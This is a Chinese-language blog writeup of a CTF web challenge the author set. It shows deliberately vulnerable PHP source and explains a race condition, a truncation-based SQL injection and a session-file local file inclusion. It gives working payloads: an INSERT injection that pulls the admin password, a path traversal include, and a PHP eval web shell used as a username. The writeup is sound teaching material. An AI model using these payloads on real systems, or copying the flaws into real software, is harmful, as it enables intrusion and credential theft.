---
source: orange-tsai
source_url: https://blog.orange.tw/posts/2015-09-ais3-final-ctf-web-writeup-race/
title: "AIS3 Final CTF Web Writeup (Race Condition & one-byte off SQL Injection) | Orange Tsai"
author: "Orange Tsai"
published: 2015-09-09T16:00:00.000Z
description: "這次為了 AIS3 Final CTF 所出的一道題目，這題在這以初新者導向中的比賽中相對難，不過其中的觀念很有趣，在解題中什麼都給你了就是找不到洞但經人一解釋就會有豁然開朗覺得為什麼自己沒想到的感覺 在做 Web 攻擊、滲透滿多時候思路不能太正派、太直觀，要歪一點、要 “猥瑣” 一點XD 純粹 code review 直接上 code (可以自己先嘗試一下找不找的到洞XD) .gist"
---

* * *

這次為了 [AIS3](http://ais3.org/) Final CTF 所出的一道題目，這題在這以初新者導向中的比賽中相對難，不過其中的觀念很有趣，在解題中什麼都給你了就是找不到洞但經人一解釋就會有豁然開朗覺得為什麼自己沒想到的感覺

在做 Web 攻擊、滲透滿多時候思路不能太正派、太直觀，要歪一點、要 “猥瑣” 一點XD

純粹 code review 直接上 [code](https://gist.github.com/orangetw/12b1dd0b64564f4ad2f7)

(可以自己先嘗試一下找不找的到洞XD)

This file contains hidden or bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

[Show hidden characters](https://blog.orange.tw/posts/2015-09-ais3-final-ctf-web-writeup-race/)

|     |     |
| --- | --- |
|  | <?php |
|  | /\* |
|  | sqlpwn by orange |
|  | Don't brute force or you will be banned ! |
|  | \*/ |
|  |  |
|  | session\_start(); |
|  | error\_reporting(0); |
|  |  |
|  | include"template.html"; |
|  | include"config.php"; |
|  | $conn = mysql\_connect($dbhost, $dbuser, $dbpass); |
|  | mysql\_select\_db($dbname); |
|  | mysql\_query("SET sql\_mode='strict\_all\_tables'"); |
|  |  |
|  | functioncheck\_login(){ |
|  | if ( !isset($\_SESSION\['name'\]) ){ |
|  | exit('not login'); |
|  | } |
|  | } |
|  |  |
|  | functionescape($str){ |
|  | $str = mysql\_real\_escape\_string($str); |
|  | return$str; |
|  | } |
|  |  |
|  | $mode = $\_GET\['mode'\]; |
|  | if ( $mode == 'admin' ){ |
|  | check\_login(); |
|  | if ( $\_SESSION\['admin'\] != 1 ){ |
|  | exit('not admin'); |
|  | } |
|  |  |
|  | includegetcwd() . '/' . $\_GET\['boom'\] . "php"; |
|  |  |
|  | } elseif ( $mode == 'post' ){ |
|  | check\_login(); |
|  |  |
|  | $name = $\_SESSION\['name'\]; |
|  | $titl = $\_POST\['title'\]; |
|  | $note = $\_POST\['note'\]; |
|  |  |
|  |  |
|  | $note = trim(escape($note)); |
|  | $titl = trim(escape($titl)); |
|  |  |
|  | if ( strlen($note) < 6 ){ |
|  | exit('para error'); |
|  | } |
|  | if ( strlen($titl) < 6 ){ |
|  | exit('para error'); |
|  | } |
|  |  |
|  | if ( strlen($note) \> 128 ){ |
|  | $note = substr($note, 0, 128); |
|  | } |
|  | if ( strlen($titl) \> 32 ){ |
|  | $titl = substr($titl, 0, 32); |
|  | } |
|  |  |
|  | mysql\_query(sprintf("INSERT INTO notes(name, title, note) VALUES('%s', '%s', '%s')", $name, $titl, $note)); |
|  |  |
|  | echo'ok'; |
|  |  |
|  |  |
|  | } elseif ( $mode == 'show' ){ |
|  | check\_login(); |
|  |  |
|  | $id = (int)$\_GET\['id'\]; |
|  | $r = mysql\_query(sprintf("SELECT \* FROM notes WHERE id='%d'", $id)); |
|  | if ( mysql\_num\_rows($r) == 0 ){ |
|  | exit('id not found'); |
|  | } |
|  |  |
|  | $result = mysql\_fetch\_object($r); |
|  | if ( $result->name !== $\_SESSION\['name'\] ){ |
|  | exit('not posted by you'); |
|  | } |
|  |  |
|  | $name = $\_SESSION\['name'\]; |
|  | $titl = $result->title; |
|  | $note = $result->note; |
|  |  |
|  | echo"title " . $titl; |
|  | echo"<br>"; |
|  | echo"note " . $note; |
|  |  |
|  | exit(); |
|  |  |
|  | } elseif ( $mode == 'register' ) { |
|  | $name = $\_POST\['name'\]; |
|  | $pass = $\_POST\['pass'\]; |
|  |  |
|  | $name = trim( escape( $name ) ); |
|  | $pass = trim( escape( $pass ) ); |
|  | if ( strlen($name) < 6 ){ |
|  | exit('para error'); |
|  | } |
|  | if ( strlen($pass) < 6 ){ |
|  | exit('para error'); |
|  | } |
|  |  |
|  | $r = mysql\_query(sprintf("SELECT \* FROM users WHERE name='%s'", $name)); |
|  | if ( mysql\_num\_rows($r) \> 0 ){ |
|  | exit('duplicated'); |
|  | } |
|  |  |
|  | $sql = sprintf("INSERT INTO users(name, pass) VALUES('%s', '%s')", $name, md5($pass)); |
|  | mysql\_query($sql); |
|  |  |
|  | $sql = sprintf("INSERT INTO locks(name) VALUES('%s')", $name); |
|  | mysql\_query($sql); |
|  |  |
|  | echo'ok'; |
|  |  |
|  |  |
|  | } elseif ( $mode == 'login' ) { |
|  | $name = $\_POST\['name'\]; |
|  | $pass = $\_POST\['pass'\]; |
|  |  |
|  | $name = trim( escape( $name ) ); |
|  | $pass = trim( escape( $pass ) ); |
|  |  |
|  | $r = mysql\_query(sprintf("SELECT \* FROM users WHERE name='%s'", $name)); |
|  | if ( mysql\_num\_rows($r) == 0 ){ |
|  | exit('user not found'); |
|  | } |
|  |  |
|  | $result = mysql\_fetch\_object($r); |
|  | if ( $result->pass !== md5($pass) ){ |
|  | exit('pass incorrect'); |
|  | } |
|  |  |
|  | $r = mysql\_query(sprintf("SELECT \* FROM locks WHERE name='%s'", $name)); |
|  | if ( mysql\_num\_rows($r) \> 0 ){ |
|  | exit('user locked'); |
|  | } |
|  |  |
|  | $\_SESSION\['id'\] = $result->id; |
|  | $\_SESSION\['name'\] = $result->name; |
|  | $\_SESSION\['pass'\] = $result->pass; |
|  |  |
|  | if ( $name == 'orange' ){ |
|  | $\_SESSION\['admin'\] = 1; |
|  | } |
|  |  |
|  | echo'ok'; |
|  |  |
|  | } elseif ( $mode == 'info' ){ |
|  | phpinfo(); |
|  |  |
|  | } elseif ( $mode == 'flag' ){ |
|  | check\_login(); |
|  | echo$flag; |
|  |  |
|  | } else { |
|  |  |
|  | // I am always on your top >/////< |
|  | $r = mysql\_query(sprintf("SELECT \* FROM notes WHERE name='orange' UNION SELECT \* FROM notes ORDER BY id DESC LIMIT 100")); |
|  | while ($row = mysql\_fetch\_object($r)) { |
|  | $id = $row->id; |
|  | $titl = $row->title; |
|  |  |
|  | echosprintf("<li><a href='./sqlpwn.php?mode=show&id=%d'>%s</a></li>\\n", $id, $titl); |
|  | echo"<br>"; |
|  | } |
|  | } |

[view raw](https://gist.github.com/orangetw/12b1dd0b64564f4ad2f7/raw/d6e3cc8b3a4e166552b6a727e9d65b21a528617f/sqlpwn.php) [sqlpwn.php](https://gist.github.com/orangetw/12b1dd0b64564f4ad2f7#file-sqlpwn-php)
hosted with ❤ by [GitHub](https://github.com/)

## [漏洞一 Race Condition](https://blog.orange.tw/posts/2015-09-ais3-final-ctf-web-writeup-race/\#%E6%BC%8F%E6%B4%9E%E4%B8%80-Race-Condition "漏洞一 Race Condition") 漏洞一 Race Condition

預設註冊的使用者都是會被放進 locks 表中鎖起來的，

但是只要在註冊中，帳號尚未被新增進 locks 表時(111 & 112 行) 馬上登入的話，

登入檢查是否被鎖住的限制就可以繞過了！

## [漏洞二 one-byte off SQL Injection](https://blog.orange.tw/posts/2015-09-ais3-final-ctf-web-writeup-race/\#%E6%BC%8F%E6%B4%9E%E4%BA%8C-one-byte-off-SQL-Injection "漏洞二 one-byte off SQL Injection") 漏洞二 one-byte off SQL Injection

當成功登入後可以新增 note 並且可以看到自己新增的 note

漏洞發生在第 58 行，當 note 的標題太長為了畫面美觀會進行截斷的動作只限制前 32 個字顯示在畫面上

這時候因為對 SQL Injection 防護是使用 escape 的方式防護，單引號(‘)會被反斜線 escape 成 (')，這時候如果精心設計一個長度正確的 payload 就可以讓防護剛好被繞過造成後面的 SQL 語句跟前方連在一起

Payload

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>``` | ```<br>POST=<br>title=phddaaphddaaphddaaphddaaphddaa_\<br>&note=, (select pass from users where name=0x6f72616e6765)#<br>``` |

`phddaaphddaaphddaaphddaaphddaa_\` (32 個字長)

會被 escape 成

`phddaaphddaaphddaaphddaaphddaa\_\\` (33 個字長)

此時踩到超過 32 長的限制 (57 & 58 行)，並進行截斷成

`phddaaphddaaphddaaphddaaphddaa\_\`

導致原本的防護被繞過，使得原本被括起來後面的單引號被 escape 原本的 SQL 語句就變成字串了

用這個方法就可以成功在 INSERT 語法中進行 SQL Injection 並在自己的 note 中看到資料，取得管理員密碼後即可變身成管理員

順道一提這個思路在 Discuz 7.2 去年還是前年被爆出的 SQL Injection 中有類似的思路

## [漏洞三 Local File Inclusion with PHP session](https://blog.orange.tw/posts/2015-09-ais3-final-ctf-web-writeup-race/\#%E6%BC%8F%E6%B4%9E%E4%B8%89-Local-File-Inclusion-with-PHP-session "漏洞三 Local File Inclusion with PHP session") 漏洞三 Local File Inclusion with PHP session

由於 include 前面不可控，所以不能使用 php://filter 或是 zip:// phar:// 等協議，而後面有 php 的後綴也不能使用 LFI with PHPINFO 的招數

不過在 PHP 中 SESSION 預設存在 /var/lib/php5/sess\_\* 中

例如 `Cookie: PHPSESSID=123php` 會產生 `/var/lib/php5/sess_123php` 的檔案

在可以偽造 `$_SESSION` 內容的時候其實就代表可以產生一個部分內容可控，部分檔名可控的檔案，這時候在使用 LFI 去包含他就可以產生一個 shell 了

Payload

|     |     |
| --- | --- |
| ```<br>1<br>2<br>``` | ```<br>/sqlpwn.php?mode=admin<br>&boom=../../../../var/lib/php5/sess_123<br>``` |

如此一來可以透過第一個漏洞註冊一個使用者名稱為 `<?php eval($\_POST[ccc]);?>` 的用戶，之後登入時指定 PHPSESSID 為 php 結尾，再利用所產生的 session file 進行 include 的動作。